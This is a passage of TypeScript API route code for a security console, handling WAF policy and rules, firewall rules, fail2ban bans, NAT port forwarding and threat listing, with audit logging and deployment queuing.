  const blockedRequests = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'waf' AND action IN ('BLOCK', 'BLOCKED') AND timestamp >= ?").get(orgId, analyticsSince) as { count: number };
  const rateLimited = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'waf' AND action = 'RATE_LIMIT' AND timestamp >= ?").get(orgId, analyticsSince) as { count: number };
  const challenged = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'waf' AND action = 'CHALLENGE' AND timestamp >= ?").get(orgId, analyticsSince) as { count: number };

  const rules = (db.prepare('SELECT * FROM waf_rules WHERE organization_id = ? ORDER BY created_at ASC').all(orgId) as any[])
    .map(serializeWafRule);
  const apps = db.prepare('SELECT * FROM applications WHERE organization_id = ?').all(orgId) as any[];

  // Count recent events per application label (the agent writes its website
  // domain/name into security_events.application).
  const appCountRows = db.prepare(`
    SELECT application, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ? AND timestamp >= ?
    GROUP BY application
  `).all(orgId, analyticsSince) as Array<{ application: string; count: number }>;
  const appCounts = new Map(appCountRows.map(row => [String(row.application || ''), Number(row.count) || 0]));

  const protectedApplications = apps.map(app => {
    const appAgents = deployment.agents.filter(agent => agent.applicationId === app.id);
    const anyFailed = appAgents.some(agent => agent.status === 'FAILED');
    const anyPending = appAgents.some(agent => agent.status === 'PENDING');
    const anyUnsupported = appAgents.some(agent => agent.status === 'UNSUPPORTED');
    const allApplied = appAgents.length > 0 && appAgents.every(agent => agent.status === 'APPLIED');
    const wafStatus = appAgents.length === 0
      ? 'No Agent'
      : anyFailed
        ? 'Failed'
        : allApplied
          ? (!deployment.engineEnabled
              ? 'Disabled'
              : deployment.mode === 'monitor' ? 'Monitoring' : 'Protected')
          : anyPending
            ? 'Pending'
            : anyUnsupported && appAgents.every(agent => agent.status === 'UNSUPPORTED')
              ? 'Unsupported'
              : 'Partial';

    return {
      ...app,
      ipAddress: app.origin_ip,
      originIp: app.origin_ip,
      agentCount: appAgents.length,
      wafStatus,
      requests24h: appCounts.get(String(app.domain || '')) || appCounts.get(String(app.name || '')) || 0
    };
  });

  // Top categories from real events
  const topCategories = db.prepare(`
    SELECT threat_name as category, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ? AND source = 'waf' AND action IN ('BLOCK', 'CHALLENGE')
    GROUP BY threat_name
    ORDER BY count DESC LIMIT 5
  `).all(orgId);

  res.json({
    status: 'Operational',
    protectedDomainsCount: apps.length,
    totalRequests24h: totalRequests.count,
    blockedRequests24h: blockedRequests.count,
    rateLimited24h: rateLimited.count,
    challenged24h: challenged.count,
    rules,
    protectedApplications,
    topCategories,
    deployment,
    agents: deployment.agents,
    wafRevision: deployment.revision,
    wafStatus: deployment.status,
    wafEngineEnabled: deployment.engineEnabled
  });
});

apiRouter.get('/waf/rules', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const rules = (db.prepare('SELECT * FROM waf_rules WHERE organization_id = ? ORDER BY created_at ASC').all(orgId) as any[])
    .map(serializeWafRule);
  res.json({ rules, deployment: WafDeploymentService.getDeployment(orgId) });
});

apiRouter.get('/waf/policy', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const policy = WafDeploymentService.ensurePolicy(orgId);
  res.json({ policy, deployment: WafDeploymentService.getDeployment(orgId) });
});

apiRouter.post('/waf/policy', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const {
    engine_enabled,
    mode,
    rate_limit_requests,
    rate_limit_window_s,
    ip_allowlist,
    ip_blocklist,
    geo_block_countries,
    bot_protection_enabled,
    sync_to_server
  } = req.body || {};

  WafDeploymentService.ensurePolicy(orgId);

  const modeValue = mode === undefined ? null : String(mode).toLowerCase() === 'monitor' ? 'monitor' : 'block';
  const requestLimit = rate_limit_requests !== undefined
    ? Math.min(Math.max(Math.trunc(Number(rate_limit_requests)) || 0, 0), 1_000_000)
    : null;
  const windowSeconds = rate_limit_window_s !== undefined
    ? Math.min(Math.max(Math.trunc(Number(rate_limit_window_s)) || 0, 1), 86_400)
    : null;

  db.prepare(`
    UPDATE waf_policy SET
      engine_enabled = COALESCE(?, engine_enabled),
      mode = COALESCE(?, mode),
      rate_limit_requests = COALESCE(?, rate_limit_requests),
      rate_limit_window_s = COALESCE(?, rate_limit_window_s),
      ip_allowlist = COALESCE(?, ip_allowlist),
      ip_blocklist = COALESCE(?, ip_blocklist),
      geo_block_countries = COALESCE(?, geo_block_countries),
      bot_protection_enabled = COALESCE(?, bot_protection_enabled),
      sync_to_server = COALESCE(?, sync_to_server),
      updated_at = ?
    WHERE organization_id = ?
  `).run(
    engine_enabled !== undefined ? (Number(engine_enabled) ? 1 : 0) : null,
    modeValue,
    requestLimit,
    windowSeconds,
    ip_allowlist !== undefined ? String(ip_allowlist).trim().slice(0, 8000) : null,
    ip_blocklist !== undefined ? String(ip_blocklist).trim().slice(0, 8000) : null,
    geo_block_countries !== undefined ? String(geo_block_countries).trim().slice(0, 2000) : null,
    bot_protection_enabled !== undefined ? (Number(bot_protection_enabled) ? 1 : 0) : null,
    sync_to_server !== undefined ? (Number(sync_to_server) ? 1 : 0) : null,
    new Date().toISOString(),
    orgId
  );

  const deployment = WafDeploymentService.queueDeployment(orgId, 'policy changed');
  const updatedPolicy = WafDeploymentService.ensurePolicy(orgId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'security-operator@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Update WAF Policy',
    resource: 'Endpoint agent WAF policy',
    resourceId: updatedPolicy.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, policy: updatedPolicy, deployment });
});

apiRouter.post('/waf/sync', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const deployment = WafDeploymentService.queueDeployment(orgId, 'manual deploy request');
  const updatedPolicy = WafDeploymentService.ensurePolicy(orgId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'security-operator@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Queue WAF Deployment',
    resource: 'Endpoint agent WAF policy',
    resourceId: updatedPolicy.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, deployment, policy: updatedPolicy });
});

apiRouter.post('/waf/rules/toggle', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const { ruleId, status, enabled } = req.body || {};

  const targetRule = db.prepare('SELECT * FROM waf_rules WHERE (id = ? OR rule_id = ?) AND organization_id = ?').get(ruleId, ruleId, orgId) as any;
  if (!targetRule) {
    return res.status(404).json({ error: 'WAF Rule not found' });
  }

  const newEnabled = enabled !== undefined ? (enabled ? 1 : 0) : (status === 'Active' || status === 'Enabled' ? 1 : 0);
  db.prepare("UPDATE waf_rules SET enabled = ?, updated_at = ? WHERE id = ?")
    .run(newEnabled, new Date().toISOString(), targetRule.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'security-operator@oat.net',
    role: req.user?.role || 'Security Admin',
    action: newEnabled ? 'Enable WAF Rule' : 'Disable WAF Rule',
    resource: `${targetRule.name} (${targetRule.rule_id})`,
    resourceId: targetRule.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('rule.updated', { ruleType: 'WAF', ruleId: targetRule.id, enabled: newEnabled }, orgId);
  const deployment = WafDeploymentService.queueDeployment(orgId, newEnabled ? 'rule enabled' : 'rule disabled');

  res.json({
    success: true,
    rule: serializeWafRule({ ...targetRule, enabled: newEnabled }),
    deployment
  });
});

apiRouter.post('/waf/rules/create', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const { name, category, severity, action, pattern, description } = req.body || {};
  if (!name || !category) {
    return res.status(400).json({ error: 'Rule name and category are required' });
  }

  const normalizedPattern = normalizeWafPattern(pattern);
  if (normalizedPattern.error) {
    return res.status(400).json({ error: normalizedPattern.error });
  }
  if (String(category).toLowerCase() === 'custom policy' && !normalizedPattern.pattern) {
    return res.status(400).json({ error: 'A match pattern is required for Custom Policy rules' });
  }

  const id = `WAF-R-${crypto.randomUUID()}`;
  const ruleId = `OAT-CUSTOM-${crypto.randomUUID().substring(0, 8).toUpperCase()}`;
  const normalizedAction = String(action || 'BLOCK').toUpperCase();
  const safeAction = ['BLOCK', 'LOG', 'CHALLENGE'].includes(normalizedAction) ? normalizedAction : 'BLOCK';
  const safeSeverity = ['Critical', 'High', 'Medium', 'Low', 'Info'].includes(String(severity)) ? String(severity) : 'Medium';
  const safeDescription = String(description || '').trim().slice(0, 1000)
    || (normalizedPattern.pattern ? `Custom match: ${normalizedPattern.pattern}` : 'Custom enterprise WAF policy');

  db.prepare(`
    INSERT INTO waf_rules (
      id, organization_id, rule_id, name, category, severity, action,
      enabled, description, pattern, updated_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
  `).run(
    id,
    orgId,
    ruleId,
    String(name).trim().slice(0, 255),
    String(category).trim().slice(0, 128),
    safeSeverity,
    safeAction,
    safeDescription,
    normalizedPattern.pattern || null,
    new Date().toISOString()
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'security-operator@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Create WAF Rule',
    resource: `${name} (${ruleId})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('rule.updated', { ruleType: 'WAF', ruleId: id, action: 'created' }, orgId);
  const deployment = WafDeploymentService.queueDeployment(orgId, 'rule created');

  res.json({
    success: true,
    rule: serializeWafRule({
      id,
      rule_id: ruleId,
      name,
      category,
      severity: safeSeverity,
      action: safeAction,
      enabled: 1,
      description: safeDescription,
      pattern: normalizedPattern.pattern
    }),
    deployment
  });
});

apiRouter.delete('/waf/rules/:id', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const ruleId = req.params.id;

  const targetRule = db.prepare('SELECT * FROM waf_rules WHERE (id = ? OR rule_id = ?) AND organization_id = ?').get(ruleId, ruleId, orgId) as any;
  if (!targetRule) {
    return res.status(404).json({ error: 'WAF Rule not found' });
  }

  db.prepare('DELETE FROM waf_rules WHERE id = ?').run(targetRule.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'security-operator@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Delete WAF Rule',
    resource: `${targetRule.name} (${targetRule.rule_id})`,
    resourceId: targetRule.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('rule.updated', { ruleType: 'WAF', ruleId: targetRule.id, action: 'deleted' }, orgId);
  const deployment = WafDeploymentService.queueDeployment(orgId, 'rule deleted');

  res.json({ success: true, message: 'WAF rule deleted. Deployment queued for endpoint agents.', deployment });
});

// ----------------------------------------------------------------------
// 6. Firewall Module & Rules
// ----------------------------------------------------------------------

// Helper to guarantee valid organization exists and is never empty
function getValidOrgId(req: AuthenticatedRequest): string {
  let orgId = req.organizationId || req.user?.organizationId || '';
  if (!orgId) {
    try {
      const row = db.prepare('SELECT id FROM organizations ORDER BY created_at ASC LIMIT 1').get() as any;
      orgId = row?.id || '';
    } catch {}
  }
  if (!orgId) {
    orgId = 'org_default';
  }
  try {
    db.prepare(`
      INSERT IGNORE INTO organizations (id, name, slug, status, plan, created_at)
      VALUES (?, 'Default Organization', 'default-org', 'ACTIVE', 'Enterprise', UTC_TIMESTAMP())
    `).run(orgId);
  } catch {}
  return orgId;
}

apiRouter.get('/firewall', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';

  const totalConnections = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'firewall'").get(orgId) as { count: number };
  const blockedConnections = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'firewall' AND action IN ('DENY', 'DROP', 'BLOCK')").get(orgId) as { count: number };
  const allowedConnections = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'firewall' AND action IN ('ALLOW', 'ALLOWED')").get(orgId) as { count: number };

  let rules = db.prepare('SELECT * FROM firewall_rules WHERE organization_id = ? ORDER BY priority ASC').all(orgId);
  // Auto-detect server firewall rules if no custom rules exist yet
  if (rules.length === 0 && orgId) {
    try {
      const detectResult = detectAndSyncServerFirewall(orgId);
      if (detectResult.importedCount > 0) {
        rules = detectResult.rules;
      }
    } catch {}
  }
  const networkZones = listNetworks(orgId);
  const deployment = FirewallDeploymentService.getDeployment(orgId);

  let natRules = [];
  try {
    natRules = db.prepare('SELECT * FROM nat_rules WHERE organization_id = ? ORDER BY created_at DESC').all(orgId) as any[];
    if (natRules.length === 0 && orgId) {
      const defaults = [
        {
          id: `nat_${Date.now()}_1`,
          name: 'Public HTTPS Ingress VIP',
          external_vip: '172.67.182.90',
          external_port: '443',
          internal_ip: '10.240.10.14',
          internal_port: '8443',
          protocol: 'TCP',
          nat_mode: 'DNAT',
          enabled: 1,
          description: 'Translates external Anycast VIP to internal DMZ backend'
        },
        {
          id: `nat_${Date.now()}_2`,
          name: 'Web Edge Proxy Forwarding',
          external_vip: '104.21.78.11',
          external_port: '443',
          internal_ip: '10.240.10.88',
          internal_port: '443',
          protocol: 'TCP',
          nat_mode: 'Full Cone NAT',
          enabled: 1,
          description: 'Full Cone NAT redirection to container cluster'
        }
      ];
      for (const d of defaults) {
        db.prepare(`
          INSERT INTO nat_rules (id, organization_id, name, external_vip, external_port, internal_ip, internal_port, protocol, nat_mode, enabled, description)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `).run(d.id, orgId, d.name, d.external_vip, d.external_port, d.internal_ip, d.internal_port, d.protocol, d.nat_mode, d.enabled, d.description);
      }
      natRules = db.prepare('SELECT * FROM nat_rules WHERE organization_id = ? ORDER BY created_at DESC').all(orgId) as any[];
    }
  } catch {}

  res.json({
    status: 'Operational',
    activeConnections: totalConnections.count,
    blockedConnections: blockedConnections.count,
    allowedConnections: allowedConnections.count,
    rules,
    networkZones,
    zones: networkZones,
    natRules: natRules.map((r: any) => ({ ...r, enabled: Boolean(r.enabled) })),
    deployment
  });
});

apiRouter.post('/firewall/rules', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { priority, source, destination, port, protocol, action, description } = req.body;
  if (!source || !destination || !port) {
    return res.status(400).json({ error: 'Source, destination, and port are required' });
  }

  const id = `FW-${Date.now()}`;
  db.prepare(`
    INSERT INTO firewall_rules (id, organization_id, priority, source, destination, port, protocol, action, enabled, description, created_by)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
  `).run(
    id,
    orgId,
    Number(priority) || 100,
    String(source),
    String(destination),
    String(port),
    String(protocol || 'TCP').toUpperCase(),
    String(action || 'DENY').toUpperCase(),
    String(description || 'Perimeter ACL Rule'),
    req.user?.email || 'SecOps Admin'
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'secops@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Create Firewall Rule',
    resource: `Firewall Rule ${id} (${source} -> ${destination}:${port})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', ruleId: id, action: 'created' }, orgId);
  const deployment = FirewallDeploymentService.publish(orgId, 'rule created');

  res.json({ success: true, rule: { id, priority, source, destination, port, protocol, action, enabled: 1 }, deployment });
});

apiRouter.post('/firewall/detect-server', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  try {
    const result = detectAndSyncServerFirewall(orgId);
    let deployment = null;
    if (result.importedCount > 0) {
      deployment = FirewallDeploymentService.publish(orgId, `imported ${result.importedCount} server rules`);
      SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', action: 'server_rules_detected' }, orgId);
    } else {
      deployment = FirewallDeploymentService.getDeployment(orgId);
    }

    res.json({
      success: true,
      importedCount: result.importedCount,
      rules: result.rules,
      deployment
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message || 'Failed to detect server firewall' });
  }
});

apiRouter.post('/firewall/rules/toggle', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { ruleId, enabled } = req.body;

  const target = db.prepare('SELECT * FROM firewall_rules WHERE id = ? AND organization_id = ?').get(ruleId, orgId) as any;
  if (!target) return res.status(404).json({ error: 'Firewall rule not found' });

  const nextVal = enabled ? 1 : 0;
  db.prepare("UPDATE firewall_rules SET enabled = ?, updated_at = datetime('now') WHERE id = ?").run(nextVal, ruleId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'secops@oat.net',
    role: req.user?.role || 'Security Admin',
    action: nextVal ? 'Enable Firewall Rule' : 'Disable Firewall Rule',
    resource: `Firewall Rule ${ruleId}`,
    resourceId: ruleId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', ruleId, enabled: nextVal }, orgId);
  const deployment = FirewallDeploymentService.publish(orgId, nextVal ? 'rule enabled' : 'rule disabled');

  res.json({ success: true, rule: { ...target, enabled: nextVal }, deployment });
});

apiRouter.delete('/firewall/rules/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const ruleId = req.params.id;

  const target = db.prepare('SELECT * FROM firewall_rules WHERE id = ? AND organization_id = ?').get(ruleId, orgId) as any;
  if (!target) {
    return res.status(404).json({ error: 'Firewall rule not found' });
  }

  db.prepare('DELETE FROM firewall_rules WHERE id = ?').run(target.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'secops@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Delete Firewall Rule',
    resource: `Firewall Rule ${ruleId} (${target.source} -> ${target.destination}:${target.port})`,
    resourceId: ruleId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  // Every console (and the ACL view on each one) hears about the removal live.
  SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', ruleId, action: 'deleted' }, orgId);
  const deployment = FirewallDeploymentService.publish(orgId, 'rule deleted');

  res.json({ success: true, message: 'Firewall rule deleted. Deployment queued for endpoint agents.', deployment });
});

// ----------------------------------------------------------------------
// 6b. Fail2ban Management (Allowlist IPs & Ban / Unban)
// ----------------------------------------------------------------------
apiRouter.get('/firewall/fail2ban', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  let config = db.prepare('SELECT * FROM fail2ban_config WHERE organization_id = ?').get(orgId) as any;
  if (!config) {
    const defaultId = `f2b-${Date.now()}`;
    db.prepare(`
      INSERT INTO fail2ban_config (id, organization_id, enabled, bantime, findtime, maxretry, ignore_ips)
      VALUES (?, ?, 1, 3600, 600, 5, '127.0.0.1/8, ::1, 10.0.0.0/8, 192.168.0.0/16')
    `).run(defaultId, orgId);
    config = db.prepare('SELECT * FROM fail2ban_config WHERE organization_id = ?').get(orgId);
  }

  const bans = db.prepare(`
    SELECT * FROM fail2ban_bans WHERE organization_id = ? ORDER BY banned_at DESC
  `).all(orgId);

  res.json({
    config: {
      ...config,
      enabled: Boolean(config.enabled)
    },
    bans
  });
});

apiRouter.post('/firewall/fail2ban/config', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { enabled, bantime, findtime, maxretry, ignore_ips } = req.body;

  const existing = db.prepare('SELECT id FROM fail2ban_config WHERE organization_id = ?').get(orgId) as any;
  if (existing) {
    db.prepare(`
      UPDATE fail2ban_config
      SET enabled = ?, bantime = ?, findtime = ?, maxretry = ?, ignore_ips = ?, updated_at = datetime('now')
      WHERE organization_id = ?
    `).run(enabled ? 1 : 0, Number(bantime) || 3600, Number(findtime) || 600, Number(maxretry) || 5, String(ignore_ips || ''), orgId);
  } else {
    db.prepare(`
      INSERT INTO fail2ban_config (id, organization_id, enabled, bantime, findtime, maxretry, ignore_ips)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(`f2b-${Date.now()}`, orgId, enabled ? 1 : 0, Number(bantime) || 3600, Number(findtime) || 600, Number(maxretry) || 5, String(ignore_ips || ''));
  }

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Admin',
    action: 'Update Fail2ban Config',
    resource: 'Fail2ban Configuration & Allowlist',
    ipAddress: req.ip || '127.0.0.1'
  });

  res.json({ success: true, message: 'Konfigurasi fail2ban berhasil disimpan.' });
});

apiRouter.post('/firewall/fail2ban/ban', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { ip, jail = 'sshd', reason = 'Manual administrator ban' } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP address diperlukan' });

  const banId = `BAN-${Date.now()}`;
  db.prepare(`
    INSERT INTO fail2ban_bans (id, organization_id, ip, jail, reason, status)
    VALUES (?, ?, ?, ?, ?, 'BANNED')
  `).run(banId, orgId, String(ip).trim(), String(jail).trim(), String(reason));

  // Otomatis masukkan ke firewall_rules agar terblokir di perimeter
  const fwId = `FW-F2B-${Date.now()}`;
  db.prepare(`
    INSERT INTO firewall_rules (id, organization_id, priority, source, destination, port, protocol, action, enabled, description, created_by)
    VALUES (?, ?, 10, ?, '0.0.0.0/0', 'ANY', 'ALL', 'DENY', 1, ?, ?)
  `).run(fwId, orgId, String(ip).trim(), `Fail2ban ban on jail [${jail}]: ${reason}`, req.user?.email || 'fail2ban');

  SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', ruleId: fwId, action: 'created' }, orgId);
  FirewallDeploymentService.publish(orgId, `Fail2ban ban on ${ip}`);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Admin',
    action: 'Fail2ban Ban IP',
    resource: `Banned IP ${ip} on jail ${jail}`,
    ipAddress: req.ip || '127.0.0.1'
  });

  res.json({ success: true, message: `IP ${ip} berhasil diban.` });
});

apiRouter.post('/firewall/fail2ban/unban', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { id, ip } = req.body;
  if (!id && !ip) return res.status(400).json({ error: 'ID atau IP ban diperlukan' });

  let target: any;
  if (id) {
    target = db.prepare('SELECT * FROM fail2ban_bans WHERE id = ? AND organization_id = ?').get(id, orgId);
  } else {
    target = db.prepare('SELECT * FROM fail2ban_bans WHERE ip = ? AND organization_id = ? AND status = "BANNED" ORDER BY banned_at DESC LIMIT 1').get(ip, orgId);
  }

  if (!target) return res.status(404).json({ error: 'Data ban tidak ditemukan' });

  db.prepare(`
    UPDATE fail2ban_bans
    SET status = 'UNBANNED', unbanned_at = datetime('now')
    WHERE id = ?
  `).run(target.id);

  // Hapus rule blocking di firewall jika ada yang terkait dengan IP ini
  db.prepare(`
    DELETE FROM firewall_rules
    WHERE organization_id = ? AND source = ? AND description LIKE '%Fail2ban%'
  `).run(orgId, target.ip);

  FirewallDeploymentService.publish(orgId, `Fail2ban unban on ${target.ip}`);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Admin',
    action: 'Fail2ban Unban IP',
    resource: `Unbanned IP ${target.ip}`,
    ipAddress: req.ip || '127.0.0.1'
  });

  res.json({ success: true, message: `IP ${target.ip} berhasil di-unban.` });
});

// ----------------------------------------------------------------------
// 6c. NAT & Port Forwarding Rules Management
// ----------------------------------------------------------------------
apiRouter.get('/firewall/nat', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  let rules = db.prepare('SELECT * FROM nat_rules WHERE organization_id = ? ORDER BY created_at DESC').all(orgId) as any[];

  if (rules.length === 0 && orgId) {
    const defaults = [
      {
        id: `nat_${Date.now()}_1`,
        name: 'Public HTTPS Ingress VIP',
        external_vip: '172.67.182.90',
        external_port: '443',
        internal_ip: '10.240.10.14',
        internal_port: '8443',
        protocol: 'TCP',
        nat_mode: 'DNAT',
        enabled: 1,
        description: 'Translates external Anycast VIP to internal DMZ backend'
      },
      {
        id: `nat_${Date.now()}_2`,
        name: 'Web Edge Proxy Forwarding',
        external_vip: '104.21.78.11',
        external_port: '443',
        internal_ip: '10.240.10.88',
        internal_port: '443',
        protocol: 'TCP',
        nat_mode: 'Full Cone NAT',
        enabled: 1,
        description: 'Full Cone NAT redirection to container cluster'
      }
    ];
    try {
      for (const d of defaults) {
        db.prepare(`
          INSERT INTO nat_rules (id, organization_id, name, external_vip, external_port, internal_ip, internal_port, protocol, nat_mode, enabled, description)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `).run(d.id, orgId, d.name, d.external_vip, d.external_port, d.internal_ip, d.internal_port, d.protocol, d.nat_mode, d.enabled, d.description);
      }
      rules = db.prepare('SELECT * FROM nat_rules WHERE organization_id = ? ORDER BY created_at DESC').all(orgId) as any[];
    } catch {}
  }

  res.json({
    rules: rules.map(r => ({
      ...r,
      enabled: Boolean(r.enabled)
    }))
  });
});

apiRouter.post('/firewall/nat', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { name, external_vip, external_port, internal_ip, internal_port, protocol, nat_mode, description } = req.body;

  if (!external_port || !internal_ip || !internal_port) {
    return res.status(400).json({ error: 'External port, internal IP, and internal target port are required.' });
  }

  const id = `nat_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
  db.prepare(`
    INSERT INTO nat_rules (id, organization_id, name, external_vip, external_port, internal_ip, internal_port, protocol, nat_mode, enabled, description)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?)
  `).run(
    id,
    orgId,
    (name || `NAT-${external_port}->${internal_port}`).trim(),
    (external_vip || '0.0.0.0').trim(),
    String(external_port).trim(),
    String(internal_ip).trim(),
    String(internal_port).trim(),
    (protocol || 'TCP').toUpperCase(),
    nat_mode || 'DNAT',
    (description || '').trim()
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'secops@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Create NAT Rule',
    resource: `NAT ${external_port} -> ${internal_ip}:${internal_port}`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const row = db.prepare('SELECT * FROM nat_rules WHERE id = ?').get(id) as any;
  res.status(201).json({ success: true, rule: { ...row, enabled: Boolean(row?.enabled) } });
});

apiRouter.post('/firewall/nat/:id/toggle', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { id } = req.params;

  const rule = db.prepare('SELECT * FROM nat_rules WHERE id = ? AND organization_id = ?').get(id, orgId) as any;
  if (!rule) {
    return res.status(404).json({ error: 'NAT rule not found' });
  }

  const newEnabled = rule.enabled ? 0 : 1;
  db.prepare('UPDATE nat_rules SET enabled = ? WHERE id = ?').run(newEnabled, id);

  res.json({ success: true, enabled: Boolean(newEnabled) });
});

apiRouter.delete('/firewall/nat/:id', (req: AuthenticatedRequest, res) => {
  const orgId = getValidOrgId(req);
  const { id } = req.params;

  const rule = db.prepare('SELECT * FROM nat_rules WHERE id = ? AND organization_id = ?').get(id, orgId) as any;
  if (!rule) {
    return res.status(404).json({ error: 'NAT rule not found' });
  }

  db.prepare('DELETE FROM nat_rules WHERE id = ?').run(id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'secops@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Delete NAT Rule',
    resource: `NAT ${rule.external_port} -> ${rule.internal_ip}:${rule.internal_port}`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, message: 'NAT rule deleted.' });
});

// ----------------------------------------------------------------------
// 7. Threats & Threat Mitigation
// ----------------------------------------------------------------------
apiRouter.get('/threats', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { severity, attackType, category, search, status, application, page = 1, limit = 50 } = req.query;

  let query = 'SELECT * FROM threats WHERE organization_id = ?';
  const params: any[] = [orgId];

  if (severity && severity !== 'ALL') {
    query += ' AND LOWER(severity) = ?';
    params.push(String(severity).toLowerCase());
  }
  if (attackType && attackType !== 'ALL') {
    query += ' AND LOWER(attack_type) LIKE ?';
    params.push(`%${String(attackType).toLowerCase()}%`);
  }
  if (category && category !== 'ALL') {
    query += ' AND LOWER(attack_type) LIKE ?';
    params.push(`%${String(category).toLowerCase()}%`);
  }
  if (status && status !== 'ALL') {
    query += ' AND LOWER(status) = ?';
    params.push(String(status).toLowerCase());
  }
  if (application && application !== 'ALL') {
    query += ' AND LOWER(affected_application) LIKE ?';
    params.push(`%${String(application).toLowerCase()}%`);
  }
  if (search) {
    query += ' AND (LOWER(summary) LIKE ? OR LOWER(source_ip) LIKE ? OR LOWER(target) LIKE ? OR LOWER(attack_type) LIKE ?)';
    const term = `%${String(search).toLowerCase()}%`;
    params.push(term, term, term, term);
  }

  // Calculate metrics directly from database
  const metricsRow = db.prepare(`
    SELECT 
      COUNT(*) as total,
      SUM(CASE WHEN LOWER(severity) = 'critical' THEN 1 ELSE 0 END) as critical,
      SUM(CASE WHEN LOWER(severity) = 'high' THEN 1 ELSE 0 END) as high,
      SUM(CASE WHEN LOWER(severity) = 'medium' THEN 1 ELSE 0 END) as medium,
